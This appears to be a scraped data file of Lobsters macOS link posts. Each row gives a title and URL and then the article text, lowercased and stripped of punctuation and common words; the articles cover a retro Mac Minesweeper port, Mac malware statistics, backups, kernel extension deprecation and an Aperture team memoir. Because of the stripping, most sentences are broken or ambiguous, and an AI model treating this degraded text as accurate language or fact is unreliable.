blackandwhite realize starfield earlier version named lightspeed c made absolutely sense time think c learned c c whatever passed c know code went away eaten grue gone think c woefully outdated symantec norton utility merged ruined going full antivirus needed something else apple development offering time mpw macintosh programmer workshop according primary environment developing serious mac program never really used free time barely glorified make script command prompt using think c many year idea programming without proper ide seemed like serious regression principle still maintain briefly dual booted beos powermac used c development environment came simple effective beide c development environment developed either nextstep time retrospect beos apis like weird mashing together nextstep mfc classic mac o unix idea main application apis named application kit like nextstep appkit b prefix instead n prefix core event loop resembled window message handling application built number rsrc resource like mac o linked executable whole thing ran vaguely posix environment access bash shell beide taken programming operating system time beos amazing cold boot desktop second unbelievable apple passed beos something called next right decision retrospect although disagreed time rat already leaving ship operating system survive without user know beos code went assume like beos code survive transition mac o x using beos noted release metrowerks codewarrior platform claimed powerful ide default beide never tried beos metrowerks released update mac codewarrior pro gave go codewarrior feature never seen graphical class browser uptodate c compiler excellent layout editor constructor ide integrated resource manager ppedit wide set resource editing tool user interface sense style use color gray although obviously still plenty gray codewarrior project window taken codewarrior pro introduction least year loved codewarrior still fondly remember box yellow black construction theming blood sweat code tagline huge leap forward represented development tool mac motorola acquired metrowerks completely fumbled mac o x transition also powerpc iridium network rokr phone everything else since mac programmer largely moved apple project builder still miss codewarrior ide aspect userinterface better major ide since codewarrior cd came custom plastic cardboard case application framework bit strange think time library bundled operating system really include standard application framework apps needed include clear talking library like appkituikit perform basic application lifecycle stage coordinate document creation persistence handle main event loop handle event dispatch offer library reusable view control earlier thing part operating system every application handle bundle framework could first framework mac platform macapp object pascal framework originally developed larry tesler course larry tesler long history software including long stint xerox parc alan kay also worked stagecast creator kid friendly application development environment originally called cocoa apple larry left apple took development environment minus name apple reused name cocoa project stagecast creator development environment formerly known cocoa first effort programming mac c involved typing application framework named skeleton book long forgotten numerous framework time used skeleton name hard work book actually read whole process complicated fact never seen c encountered compiler issue tended add sigils parameter arbitrarily cast pointer compiler shut left wonder caused erratic crashprone result memory protection say crash mean needed reboot whole computer painful learning process c use asterisk declaration eg sometype somepointer define pointer asterisk elsewhere eg somepointer dereference pointer remains one newcomer hostile syntax decision ever encountered language gone object pascal pointer syntax even look like smiley skeleton enough write first application one stick memory version minesweeper line single mainc file contained resource asset since really understand thing drew artwork pixel pixel c code long gone assume flawless clearly learned everything know c moved onto c think c environment using included think class library tcl spent time learning c learning tcl remember reading tcl manual chapter remain mind talked object oriented programming though solved problem immediately segued infamous diamond inheritance problem discussion car also plane thing never change find image actual think c manual used redwhiteandblack styling disk multiple tome heavy enough crush elephant thing delivered box doubled miniature bookshelf still dwarfed apple least volume inside macintosh series armed c tcl halffinished numerous program flawless last year system drew close time start fresh time powerplant application framework bundled codewarrior kept codewarriorpowerplant project kept maybe one day try get engineering final year project working enticingly named image analysis using zernike moment best rotionally invariant orthogonal polynomial image recognition mac app year time might right bring back yet time zernike moment instead want look first program wrote powerplant reimagining earlier flawless masterpiece minesweeper implementation hoping year since earlier minesweeper implementation learned basic pointer syntax powerplant need get powerplant building try build powerplantbased app fortunately powerplant ended open source freescale motorola spinoff took codewarrior open sourced powerplant bsdstyle license powerplant framework project largely abandoned exists worked first mac o x version mac o x version powerplant requires mac o x sdk earlier build build sdk certainly sdk last version xcode include sdk xcode series mac o x lion run sierra open bundle copy folder place location xcode bundle enough get sdk work also need edit minimumsdkversion xcodeappcontentsdeveloperplatformsmacosxplatforminfoplist file xcode bundle okay xcode set create project file idea file powerplant need optional extra threw everything single xcode target set build intel build sdk added sdkroot developerheadersflatcarbon header search path set always search user path compile source c arbitrarily chose one prefix header set c dialect standard library libstdc hit build see would happen oh hi opentransport remember thing going oh sad stopped existing mac o x fine everything networking get removed build apparently trying build old library named morefiles even though version still appear exist github optional disable debugging function causing problem go dozen switch statement appear variable defined within case label bothering clang need wrap scope gestalt driving crazy telling return correct o version past mac o strip hardcode result fool dozen little change later everything appears work carbon version mine mine application around line code split across class small tiny end program size scale however unlike powerplant updated mac o x tried run compile mine application since mac o back never ported apps classic mac o mac o x know smooth turn morethanoneline code change needed make replace standardgetfile standard open file dialog classic mac o function part carbon need replaced navgetfile dutifully made line change subsequently realize code used application save file opening file nothing minor compatibility change made getdatetime cfabsolutetimegetcurrent rgnbbox getregionbounds whole everything appears compile without serious drama resource fork course upon running program immediately aborted trying find required resource classic mac o resource anything particularly strange really way serializing number binary blob single file resource uniquely identified type code index resedit probably widely used development tool classic mac o era none represents problem represent problem resource stored separate resource fork file way made sense blob often metadata data stored data fork nice idea rich structured metadata storing metadata outside data fork problematic world file moved operating system file system interoperate via single data fork metadata either get lost end series annoying hidden file short rich metadata purgeable like spotlight metadata regenerated contextually main data next time spotlight see file nonpurgeable metadata main data fork accordingly resource fork always deprecated mac o x read effort rather needing effort far better move old resource fork minesrsrc standard resource minesppob powerplantspecific resource data fork single file new data fork resource file named minesrsrc basename executable placed application bundle resource folder data fork automatically read call getresource shortest way run derez two resource fork eg derez minesrsrc minesr derez minesppob concatenate two file use rez build back single data fork rez minesr usedf minesrsrc small note concatenation file may produced classic mac cr line ending file also contains unix lf line ending rez silently ignore everything point spent minute wondering none resource ppob file found unix lf crept class mac cr line ending file alive let realistic minesweeper implemention resource fixed application run click new game leftclick tile reveal shiftclick mark possible mine singlebutton mouse time continue clearing every nonmine revealed use game option game menu change number mine size field whether timelimit whether game auto started remain plenty quirk leave asis mine item mine menu work item menu nothing including two quit mine entry probably created powerplant quit app use quit bottom file menu quick code analysis worst code likely see tidy coherent even demonstrates apparent ignorance larger scale design pattern obvious problem square minefield represented simple short adjacent mine count cleared status flagged status packed short using bitmasks technical level work fine except packing unpacking data short work left cmineswindow requiring methodical menial work every location minefield accessed clearly would better tile c class method return isflag numadjacentmines packing unpacking data abstracted away internal technical detail perhaps proper bitfields would make cmineswindow code easier read would likely significant linesofcode saving add one proximity count surrounding square randnum mfieldwidth randnummfieldwidth mminefield keightmines mminefield mminefield keightmines mminefield randnummfieldwidth mminefield keightmines mminefield code really abstracted away behind dedicated tile minefield interface lead idea mine field single minefield data type know determine adjacent tile know bound know populate know propagate revealed zero tile need consider fact state game time remaining mine remaining mine field part game data type know start game based set initial difficulty setting serialize user instruction stream reveal tile protect tile game easy serialize save restore pause neither possible existing game finally lead question whether modelviewcontroller separation code clearly separate model view controller class still possible identify data member method correspond even though part cmineswindow interface instance variable cmineswindow defines really model data everything viewrelated purely inherited cwindow cminesview controller code occurs cwindow lperiodical llistener method override propagate change view outside environment model constructor cmineswindow cmineswindow lstream instream lwindow instream initialise variable mfieldheight mfieldwidth mnumcoveredsquares mfieldheight mfieldwidth mnummines mgamelength mingame false mautostart false muntimed false place decorative minefield window start mminefield short newptr sizeof short throwifmemfail mminefield clear minefield short mfieldwidth mfieldheight mminefield kzeromines exactly code expect find window constructor ignoring superconstructor method purely concerned model given perfectly valid criticism surprising tidy organized code guess abstraction really matter much code small handle general looking mac o era code strange expected maybe still accustomed reading c c daily life different code still actively maintain today c function taking multiple carefully allocated configured struct parameter returning error code ugly still ugly find plenty modern corefoundation function work way really jump code another world handle remember memory layout preos x era mac o fixed application given specific memory size launch stack top heap bottom two raced towards frequently colliding outofmemory stack overflow situation could get info application give memory next launch launched application easily get memory figure stack macintosh memory management inside macintosh volume one biggest problem arrangement memory fragmentation allocating deallocating heap memory pattern leaf unusable hole heap memory fragmentation still exists partially mediated memory paging better allocator usually ignore excess memory usage big issue gb ram era computer might le ram memory fragmentation serious problem address mac o used handle different window handle memory resource owned operating system behalf instead mac o handle pointer pointer dereference handle get master pointer lived special master pointer block ideally bottom heap dereference master pointer finally get actual block advantage approach master pointer block fixed location actual block relocatable could moved memory manager resolve heap fragmentation figure handle relocatable block macintosh memory management inside macintosh volume time wanted access handle data dereference level could find possibly moved location needed use function could move memory needed careful call hlock hold handle place otherwise every pointer handle content would invalid needle say caused memory corruption regular basis failing consider heap compaction around pointer good time figure heap compaction macintosh memory management inside macintosh volume also needed guess many handle would needed program allocate correct number master pointer block program startup master pointer block could added time since master pointer block fixed location allocation would fragment memory appeared middle heap course none ever applied mac o x hlock movehhi moremasterpointers related handle function always noops mac o x handle nonrelocatable like normal pointer allocation relying paging better heap allocator mediate fragmentation entire concept relocatable memory block trying plan peak memory usage program started seems surreal independent review got mine running sitting computer screen mission accomplished go cook dinner return one child sitting computer playing game apparently wife given instruction play child continued playing another half dozen game wife left help dinner sure child ever much looked one computer program written much le played minute opinion good take conclusion update macos code article longer compiles due deprecation macos see article update edition information download mine github account code two different open source license due inclusion powerplant remember still need obtain copy mac o x sdk modify mac o x platform infoplist file get error missing sdk try build consult readme file detail really expect get mine running end surprisingly simple mean took nearly hour get powerplant building omitted wrong turn involved brevity also spent couple hour trying get powerplant constructor application read old ppob resource cover eventually worked replacing fspopenresfile fsopenresourcefile forcing loading ctyp resource file riddled issue parsing layout color want actually maintain userinterface way updating mine application code powerplant mac o change required le minute ignoring time wasted due line encoding issue r rez file game simple full quirk design issue gameplay problem try setting board size largest mine game basically solves obviously quality game wanted see could
103,Lobsters,mac,Apple macOS,!BANG - DuckDuckGo Bang Auto-Complete Workflow for Alfred,https://github.com/dkarter/Bang,bang duckduckgo bang autocomplete workflow alfred,installation usage demo license,duckduckgo bang autocompletion installation download workflow file repo open alfred usage must run update using download completion data duckduckgocom getting completion data use workflow either typing alfred search box using systemwide shortcut ctrl demo license mit duckduckgo name logo trademark duck duck go inc
104,Lobsters,mac,Apple macOS,"Mac malware outpaced Windows PCs threats for first time in 2019, report says",https://appleinsider.com/articles/20/02/11/mac-malware-outpaced-windows-pcs-threats-for-first-time-in-2019-report-says,mac malware outpaced window pc threat first time report say,pdf link industry estimate two quarter,according report malwarebytes tuesday number malware threat detected mac endpoint outpaced targeting window pc first time adware accounting bulk detected threat annual state malware report pdf link antivirus software maker malwarebytes tracked increase detected mac malware yearoveryear basis tallying threat detection per endpoint basis calculus applied account growth number mac running malwarebytes software firm found threat per mac endpoint comparison result show average threat detected per window endpoint period report speculates mac quickly becoming sweet target cybercriminals due increased marketshare though recent industry estimate show apple slice market shrank past two quarter perhaps likely notable increase fringe software malwarebytes note apple standard macos security safeguard focused thwarting serious malware borderline adware potentially unwanted program pup allowing latter two family propagate speed mac differ drastically window term type threat seen report read found several different category family top detection window threat classify traditional malware especially aimed business mac threat certainly prevalent one family adware potentially unwanted program pup indeed prevalent mac threat newtab particularly insidious family adware detected nearly million time pcvark pup took third place crossplatform detection ranked second mac category almost many detection newtab period mackeeper infamous system cleaning program previously malwarebytes list top mac detection fell third spot fellow pup jdi macbooster took fourth fifth respectively top traditional malware sometimes defined backdoor cryptominer spyware osxgenericsuspicious group file exhibited similar malicious behavior osxgenericsuspicious scamenabling software fakefileopener topped detection despite growing number malware detection least discovered malwarebytes platform mac still safe environment long user remain conscious bad actor noted report one malware incident involved duping user downloading opening offending software lone vulnerability impacted mac according malwarebytes firefox zeroday targeting cryptocurrency company
106,Lobsters,mac,Apple macOS,Bye-bye Time Machine,https://www.tbray.org/ongoing/When/202x/2020/02/04/Bye-Bye-Time-Machine,byebye time machine,time machine arq backup little jiggerypokery workdocs tbrayorg protecting data,recently switched backup tool apple time machine arq backup need clearly better realized wondered whose need would best served time machine honest hard time time machine setup used time capsule airport many year switched synology mirrored drive took little jiggerypokery get mac synology talking nicely thing seemed work recently regular interval time machine say something like time machine enthrophased gnocchometric continuum need back scratch maybe part backup scratch actually monophorically phosphorylated interpretivedance phlogiston quite remember whatever much sense made pretty fast home network also really big disk start scratch meant multiple day waiting doover backup job confidencebuilding experience arq parallel timeline point asked world good mac backup software lot people said arq ok signed paid gave whirl somewhat lost faith anything useful term time machine backup went bought usb drive nearest drugstore plugged say onboarding user experience could better arq terminology backing selfexplanatory one might like pretty sure figured right incantation running arq user experience vastly better time machine tell take seems like reasonable amount time time machine never tell anything actually useful often unifying theme whatever fails process take hour nobody care backup thing anyone care restore verified restore data time machine time done migrating one mac another work fine like everything else time machine painfully slow opaque also read enough testimonial arq user convinced job ask time machine hero moment finder view replicated back timeline go find version file date bring present day like know time machine like suspect people dazzled ui first time saw year number time used restore mode zero said done wholesale restore new mac twice purpose fancy ui irrelevant little thought becomes obvious need timeline file computer care photograph load lightroom mostly edit lightroom edits nondestructively recording delta raw file really care mostimproved version original raw want try another treatment photo make virtual copy net effect ever care recent version file timeline buy nothing work document collaborate version like hell mostly workdocs keep doc version somewhere cloud really care current working version might ahead cloud latest timeline buy nothing code hosted git care workspace might noticeably ahead last commit timeline buy nothing blog piece live macbook tbrayorg server process getting ready push feel like monotonic improvement never felt slightest urge dig old version timeline buy nothing leaf one category timeline might winner deletion protection surely delete file regret handy scroll timeline back pick guess might true people never delete anything seriously going erase data think hard first thinking waste precious time brain bandwidth data cheap keep cost wrong high timeline buy nothing exception thing really want delete evidence sketchy sex kink premature antifascism whatever protip put kind thing somewhere backed conclusion arq great little bird told product oneperson operation vcfunded aspirational bayarea unicorn internet need another little bird recently told arq got serious lookover pretty elite opsec group said lgtm internet need mac datahandling practice like mine advise sending arq money bonus wrote protecting data mostly subject dedicated reader may enjoy tracking evolution thinking subject
107,Lobsters,mac,Apple macOS,macOS kernel extensions are officially deprecated,https://developer.apple.com/support/kernel-extensions/,macos kernel extension officially deprecated,deprecated kernel extension system extension alternative transitioning kernel extension kauth endpointsecurity network filter networkextension iohidfamily hiddriverkit iousbfamily usbdriverkit usb networking networkingdriverkit usb serial usbserialdriverkit usb vendor specific ipc usbdriverkit iousbhost driverkit contacting u entitlement request entitlement feedback provide feedback,deprecated kernel extension system extension alternative system extension macos catalina allow software like network extension endpoint security solution extend functionality macos without requiring kernellevel access announced deprecation kernel extension part ongoing effort modernize platform improve security reliability enable userfriendly distribution method kernel programming interface kpis deprecated alternative become available future o release longer load kernel extension use deprecated kpis default transitioning kernel extension software us deprecated supported kpis need factor deprecated component standalone system extension software us new system extension legacy kernel extension distribute supported operating system software support broad range macos version continue use kernel extension older version run system extension supported list deprecated kpis macos macos use deprecated kpis trigger notification user software includes deprecated api asks user contact developer alternative kauth please use endpointsecurity instead following deprecated kpis kauthlistenscope kauthunlistenscope network filter client use networkextension instead following deprecated kpis ipfinjectinput ipfinjectoutput ipfremove sfltattach sfltdetach sfltregister sfltunregister sockaccept sockbind sockclose sockconnect sockgetpeername sockgetsockname sockgetsockopt sockgettype sockinjectdatain sockinjectdataout sockioctl sockisconnected sockisnonblocking socklisten sockreceive sockreceivembuf socksend socksendmbuf socksetpriv socksetsockopt sockshutdown socksocket sockoptcopyin sockoptcopyout sockoptdirection sockoptlevel sockoptname sockoptvalsize iohidfamily kpis iohidfamily deprecated client use hiddriverkit instead iousbfamily iousbfamily deprecated header removed sdk since macos el capitan client move iousbhostfamily usbdriverkit appropriate outlined usb networking combination using ionetworkingfamily kpis well usb kpi iousbhostfamily iousbfamily deprecated usb kpis alternative usbdriverkit client ionetworkingfamily kpis use networkingdriverkit instead usb serial combination using ioserialfamily kpi well usb kpi iousbhostfamily iousbfamily deprecated usb kpis alternative usbdriverkit client ioserialfamily kpis use serialdriverkit usbserialdriverkit instead usb vendor specific ipc kernel extension using usb kpi iousbhostfamily iousbfamily tie io family subsystem us iouserclient subclass ipc deprecated usb kpis alternative usbdriverkit consider iousbhost driverkit also mechanism communication channel contacting u entitlement deploy driver built driverkit allow developer use system extension use endpointsecurity api need entitlement applerequest entitlement feedback feedback valuable help inform direction system extension development send u api enhancement request bug reportsprovide feedback
108,Lobsters,mac,Apple macOS,Pock: Display macOS Dock in Touch Bar,https://pock.dev,pock display macos dock touch bar,preference,preference adjust pock widget setting reflects specific need access pane preference menu item
109,Lobsters,mac,Apple macOS,Vintage Apple,https://vintageapple.org/,vintage apple,apple mac manual mac book original inside macintosh series revamped inside macintosh series apple ii laserwriter catalog apple steve job mirror donating byte magazine byte magazine vintage mac catalog softalk magazine macuser macuser macworld develop magazine macuser macuser mac programming book macworld vintage mac book,update linking projecs love hope love added collection apple mac manual official apple publication came mac apple software added book mac book collection vintage mac book collection added original inside macintosh series related material revamped inside macintosh series added apple ii related material added laserwriter related material added many catalog collection added book apple steve job added mirror gamba site dead last issue byte magazine added byte archive complete many thanks national museum computing canada providing mising issue please consider donating support computer history added http support site vintage mac obsession safe prying eye hope help google ranking people find site useful info herein may problem anyone accessing site vintage mac let know wish available nonhttps still added restored byte magazine collection missing issue entire run magazine added restored byte magazine collection includes issue various vintage mac catalog added softalk magazine archive added archive total gigabyte final missing damaged issue issue macuser added updated macuser collection complete going october october macworld issue added develop magazine added year added macuser archive macuser archive added mac programming book added macworld archive added vintage mac book added
110,Lobsters,mac,Apple macOS,Is Catalina a good upgrade yet?,https://eclecticlight.co/2020/02/02/last-week-on-my-mac-is-catalina-a-good-upgrade-yet/,catalina good upgrade yet,michael tsai small warning like,past catalina midpoint four version already released three go prepare first release stark fact point cautious consider whether run unusually macos many mac user catalinacompatible mac able upgrade back october include many still rely apps whose mac start ssd still reliant apps could disqualify upgrading even looked deeper perhaps common example still dependent adobe earlier likeforlike upgrade purchase option adobe require costly subscription cc nonstarter many rely apps hobby lowpaid work worthy replacement serif remains problem maintaining access old document orphaned apps direct replacement run catalina working contact support extended feature custom layout printing given decline printing look unlikely sufficient demand make replacement commercially viable anyone reliant hf feature also problem option catalina boot anything apfs volume group ironically catch time machine present still requires user keep local backup hf volume one substantial group user whose mac boot hard disk even fusion drive apple continues sell several imac base system internal hard disk group going away hurry apfs performance hard drive good remain question whether wise option fusion drive particularly smaller ssd component case hard disk something apple likely improve much result design goal apfs use ssds user upgrade question whether safe yet far macos go relatively serious issue become apparent important relate le bundled apps particularly mail bug lost message time machine backup mail bug general least fix one serious bug report anything go michael tsai considers least one remains apple appear acknowledged issue mentioned fix clear whether relied address remaining problem heavy mail user may still good reason delay upgrading time machine issue equally frustrating apple failure communicate small warning passing various support note upgrading could result change time machine backup make incompatible previous version macos problem perhaps conversion completely reliable small significant minority upgrade catalina lose old backup devastating particularly completely unprepared simple solution starting new backup series archiving old backup easy may sound upshot going many mac user simply risk upgrading catalina stuck running high sierra whose support expected end later year mojave whose support expire month apple need reconsider whether current support policy realistic growing number user currentlysold mac stuck running older version macos future plenty user buying new mac find support macos expires long hardware glib answer hardware capable got internal hard disk slew apps run anything newer macos one solution many orphaned user could atcost apple programme replace hard drive possibly fusion drive ssds recent model least model boot run catalina briskly internal storage many user drawback catalina largely result apple becoming overextended catalina run best mac hardware specification apple marketing yet prepared make baseline model imac seems horribly like mess apple got amount memory supplied original mac first year release everyone knew kb memory insufficient apple still soldered base model mac like like loading related
111,Lobsters,mac,Apple macOS,"Firing Up the Apple //c for ""Not x86 Week""",https://bytecellar.com/2020/01/26/firing-up-the-apple-c-for-not-x86-week/,firing apple c week,week rretrobattlestations different spot proterm agate post buckshot covered demoed earlier post lrzsz aptget,write last day week reddit rretrobattlestations one might guess week competition display vintage system based cpu intel descendant round featured apple c situated desk dc workplace setup c lived different spot since acquired back desk cubicle year ago serial port connected wire put together old atari video cable usbtoserial adapter plugged raspberry pi connected guest wifi network university allows use terminal program c proterm modem mgr agate allow become standard serial terminal raspbian linux o running pi oldschool serial terminal support still bakedin modern linux distribution go greater detail overall approach post detailing first go using c serial terminal mac mini previous workplace occurred past friday use c entry mentioned competition end tonight rather turning c putting text screen thought would nice touch display intel outside logo quite popular year mac amiga folk screen meant finding logo online somehow converting apple ii highres hgr image getting c notion using c competition occurred earlier week probably would used lanconnected apple iigs home write floppy image file last day office weekend conclusion competition much already place described get done bit process go full distance dug around online found program called buckshot image conversion utility macos window linux convert modern format image image apple ii image mode nice little utility handy image preview function based program called covered demoed earlier post blog hand search found amusing logo image created mono highres apple ii image pixel next step get image mac desk apple c c attached device capable reading sd card like image file needed transferred via serial transferred image mac raspberry pi via sftp wanted use sz lrzsz package initiate zmodem transfer pi c found sz installed pi problem attempting install via aptget take different approach logged web host manager remote web server used rpm package manager install lrzsz sftp ed apple ii hgr image server used c running proterm acting serial terminal pi ssh pi remote server kicked zmodem send image using sz proterm recognized began receiving image floppy c got basic prompt prodos performed bload intelbin loaded displayed image c hgr highres graphic screen line basic text place week competition fun exercise usually case rretrobattlestations challenge course always fun show lovely little machine encourage retro computing reader join fun
112,Lobsters,mac,Apple macOS,Aperture: Senior QA (2004-2005),https://techreflect.net/2019/12/10/aperture-senior-qa-2004-2005/,aperture senior qa,note huge reason joined team first place interview james dempsey early day photoplusexpo unique thing interlude going sour yelling begin yelling continues interlude stupid shit let add engineer mythical manmonth endgame bertrand serlet aperture may aperture may many year later,indepth article apple career note experience aperture many hundred story experience project tricky write much positive negative emotion involved real roller coaster paul marcos engineer mail unofficially mentor huge reason joined team first place heard leaving mail like punch gut asked going say apple said could come instantly felt better loved mail thought entirely new product scratch appealing note image newer version aperture interview interviewed know assembled team many people already knew already mutual respect least awareness sure help people category randy ubillos stan jirman cocreators aperture james dempsey dan waylonis loved people interviewed hesitant consider project one would tell last interview randy helped hesitation subject working unknown project came said paraphrased tell working look around office might get idea moved hand across office wall covered beautiful picture taken ok working photo app awesome early day aperture year away shipping joined software mostly series demo unique ship date set stone apple caught wind adobe working lightroom course wanted beat punch wanted announce photoplusexpo new york fall apple like announce ship time within month team stellar senior despite assembled quickly feel team together long time everyone seemed know least people hire secret project hard advertise people go word mouth much laughter hard believe even thing turned sour party randy house remember hour continuous laughter team incredible sense humour kind people wicked smart neither randy stan manager rany sort spiritual leader cocreator project facilitated lot debate aperture discussion spirited intense civil everyone say joke crack unique thing several unique thing team worked differed apple practice even writing code feature software engineer qa engineering would collaborate document detailing test plan party learned lot created great relationship another wonderful thing hired two professional tier work project one photo cover dozen national geographic magazine use aperture professional workflow attend meeting share experience excellent idea needed become well versed photography team cabinet full every supported camera could checked like library went field trip learn in out different camera people like randy stan photography expert would help others great fun reasonable number qa engineer rare software product since professional product knew quality high interlude interlude take break story point project going move infinite loop de anza think generic office building across street way main campus seemed like demotion space concern headquarters trying move pro apps one building benefit reason mention senior member team vociferously objected plan wanted walk short distance eat cafe perk main campus threatened quit moved u backed power went right across executive suite given close steve job office saw area clear pro apps thing aperture radar going sour near early summer management started panic feature late ship date could change work software seen happen handle determines product come together short version tremendous amount shit hit fan one best project ever quickly turned nightmare outcome uncommon first volley management cut feature actually finished worked well result merely give illusion progress charge printing worked amazingly well unique feature probably exist even today program worked hard nuked feature practice led lot frustration animosity everyone involved engineer understand kill feature coming together indiscriminate killing feature harbinger thing come yelling begin started lot yelling even people typically mildmannered pressure coming high one day sent group email saying everyone needed start working night weekend end project keep mind project still roughly six month go people kid would sacrificing entire summer historically always refused come work work like hell brain shuts need go home unwind thing people spend lot time unproductive thing easier handle long hour known apple speaking people unhappy especially one saying anything reply email replied go along mandatory work hour said anyone problem much work got done let know long hated measured numeric criterion hour worked bug written note reply went everyone got original email person sent email came office within minute slammed door shouted loud people heard five office away dare bellowed fucking whole project said say yelling talking yelling saw every engineer experienced version feel comfortable retelling multiply experience give idea yelling continues later project called qa engineer together told u new manager know looking one involved interviewing pissed voiced strong objection especially since six month shipping vocal everyone knew felt refused work company situation like always ended badly believe apple protest made chain dragged u meeting brought hr person bode well hr person eventually became wonderful friend todd barrett transpired fucking crazy manager screaming u loud hurt ear face red sweating hr person nothing friend point meeting terrifying nightmare later couple time manager came office stood door yell spoke rather loudly anxiety attack time eventually got fired year later manager mad even given manager chance yet point time meeting intuitively knew newly hired manager head clear u going work bringing speed benefit would get turned right yelling disaster gave u ipod nanos took u bowling say another fun story dragged bug review meeting several time management seriously yelled u writing bug bug never written shouted argued write bug incomplete feature engineer wanted felt worked daytoday basis feeling find bug record remember check later sure something might done maybe found even checklist engineer engineer liked way manager trying keep bug count adopted tactic lot cry project one person nervous breakdown one person cried one office remember vividly thought going get one saturday going see kid forcing work interlude another interlude break thing bit new bos hired team without approval uncanny ability say unintentionally hilarious thing example discovered one point worked cruise ship asked said used captain ball course everyone laughed quite sure make guess bit verbal gaffe machine although harmless fun another gaffe became legendary current politically correct climate say exclude imagine fucking hilarious speaking politically correct one member team office fridge stocked lime coke apparently longer available referred gay coke gay team member thought hilarious feel ok sharing want inject levity interlude randy always hilarious went rant one favourite ranted flowchart despised went far saying anyone make flowchart fired thought funny rant brought guy write redeye filter since everyone busy let loose worked reasonably well finished randy discovered c code despite entire project objectivec went massive rant stupid apple fire anyone writes c code somewhat agree stupid shit management knew pretty much everyone unhappy tried ridiculous thing appease rather better manager practice unique project even apple made different much effect cumulative especially month yelling one day gave away gift bag everyone cheer u something went back office started unpacking cheap crackerjack style toy awful candy artificial flavour colour packed shit going make productive healthy ipod pretty cool sitting around talking later day making fun gift bag someone mention ipod pretty cool half people said ipod seriously gave away identical bag everyone half people got ipod asked said mistake explain speculation good engineer mind management got ipod rest got stiffed saw get seemed people gotten flak management another fun story rise fact prolific bug writer throughout career manager love plot bug count try see make graph get zero specific date found secondhand highlevel meeting took place late project discussing risk project shipping time considered risk project number bug filed say let add engineer tried cutting finished feature yelling people working people point nervous breakdown came upon brilliant idea let steal hundred engineer team project magically get done time software engineer reading already laughing sure wellknown book called mythical manmonth argues adding people project make ship later paradoxical seems true practice aperture could case study instead dozen engineer busily work feature project became dozen engineer another dozen engineer lining outside office new people needed come speed massive project ship month original engineer longer writing code madness also line outside office brought three dozen qa engineer none headstart project photographic experience remember iphone terrible impossible situation great people though every week new people barely knew name imagine even able get point people would come office ask question ask make matter even worse brought second set manager team snagged new engineer fuck charge exactly endgame shipped product introduced show planned despite long list wart terrible performance much engineering team proud product especially given schedule circumstance continued use primary photo app even though hardcore professional others team bitter refused use final product management felt original engineer crap product crap blamed u problem took blame given happened started looking around job elsewhere right product shipped since aperture well known apple disaster wondered job search would go said worked aperture get sympathetic response oh sorry hear graciously bertrand serlet head software engineering told directs bunch great engineer aperture going sending resume told ignore gossip hire people forever grateful downside think secret received untruthful leak member extended aperture team think secret nowdefunct popular rumour website daring fireball premier mac web site republished story comment apple recently asked engineering team behind aperture photo editing management software leave think secret learnedaperture may truth firing took place wanted leave shit happened also feel particularly welcome original engineer found job quickly one quit two stayed team incensed someone spread lie anonymously leaked something time career daring fireball covered leak engineer corroborated last week wrote aperture dirt regarding think secret scoop regarding dispersal aperture development team future aperture emphasized source information secondhandsince heard additional source apple including firsthand source one developer original aperture engineering team obvious reason source requested anonymityno one original aperture engineering team fired removed team yes member original engineering team left project volition described spectacularly bad managementevery one engineer easily found work one left company rest found position elsewhere applemore aperture may many people including developed longterm health problem one person mentioned nervous breakdown others took forever get spark back career would look people eye look like someone close died amusing aside annual review got substantial bonus ever gotten significant salary increase guess getting yelled screamed perk felt guilty know many year later terrible story become entertaining moved part overall think great project first half overshadowed second half know others share opinion given horrific second half give idea special felt team one favourite story involves unnamed engineer joined team one borrowed engineer arrogant vocal every engineer original team sucked point running bug review meeting stand back bug came screen typical response code shit need rewritten one day bug wrote came screen everyone room scratching head poorly written bug vague rambling incoherent said bug shit need rewritten everyone room laughed seemed redden fast forward ten year apple watch team offered job working swiftui project started watch team engineer manager team watch organization offer job someone get reviewed highlevel meeting future manager brought engineer voiced strong objection said big pain as argue favourite postaperture story though everyone original team fantastic poster made photo taken randy ubillos home party mentioned previously everyone picture signed poster everyone got one always treasured looking made feel like shitty time never happened one day realized seemed fading realized still kind crappy frame went frame shop looked poster noticed randy signature missing cofounder team someone much enjoyed working signature essential forget sign walked around shop trying figure corner eye spotted nearly invisible writing poster precise angle could see ghost randy signature pen used must far sensitive light others used decided contact randy see maybe could sign felt weird talked aperture since blew know lingering bitterness graciously accepted invitation went office chitchatted bit thanked agreeing sign poster pointed wall nicely framed version poster talked great time great team said one happiest time apple agree p never though leaving apple even darkest day aperture wonderful day previous job amazing stick around
113,Lobsters,mac,Apple macOS,Building a Spotify player for my Mac SE/30,https://68kmla.org/forums/index.php?/topic/55998-building-a-spotify-player-for-my-mac-se30/,building spotify player mac,,includes system stuff productivity emulation design game preos x mac
114,Lobsters,mac,Apple macOS,Low Power Mode for Mac laptops: making the case again,https://marco.org/2020/01/13/macos-low-power-mode-redux,low power mode mac laptop making case,pro mode may coming mac laptop need low power mode fantastic disabling intel turbo boost laptop turbo boost switcher pro first argued low power mode macos macbook pro macbook pro late ghz fan never audibly spin run significantly cooler hot significantly longer battery life turbo boost switcher pro much better laptop warns incompatible future version macos,light today rumor pro mode may coming seems offer benefit opposite wanted remake case low power mode macos explain time modern hardware constantly push thermal power limit trying strike balance minimizes noise heat maximizing performance battery life software also play role trying keep everything backgroundupdated contentindexed photoanalyzed ready u want aggressively notice cost performance battery life apple customer usually control balance usually fixed design time little opportunity adapt changing circumstance customer priority sole exception low power mode io seems huge hit offering single toggle chooses different balance people able greatly extend battery life know need mac laptop need low power mode believe strongly potential using laptop way year fantastic disabling intel turbo boost laptop turbo boost switcher pro time since first argued low power mode macos list possible tweak concluding disabling turbo boost still best bangforthebuck tweak improve battery life without noticeable performance cost recently intel crammed core higher clock smaller form factor pushed thermal limit new extreme gain become even significant thermal testing macbook pro macbook pro late ghz power temp geekbench singlemulti xcodebuild normal sec turbo turbo boost disabled peak cpu power consumption drop correspondingly huge reduction temperature two massive benefit fan never audibly spin turbo boost enabled fan annoyingly spin every time system heavy sustained load disable almost impossible get audible run significantly cooler turbo boost let laptop get hot comfortably hold lap much heat radiates make hand sweaty disable laptop get moderately warm hot hand stay comfortably dry done formal battery testing since difficult timeconsuming controlled way actually useful people anecdotally seeing similar battery gain disabling turbo boost seen previous laptop significantly longer battery life estimate come cost performance noticeable workload parallel workload affected far le singlethreaded task modern heavy workload parallelized laptop competitive imac pro much faster people need included time spare performance get benefit fast laptop useful hand sweaty type battery dy middle flight loud fan ruin audio recording really want maximize performance turbo boost switcher pro let quickly toggle menu bar switching mode easy vast majority time using macbook pro much better laptop turbo boost disabled still fast enough everything need including significant development xcode 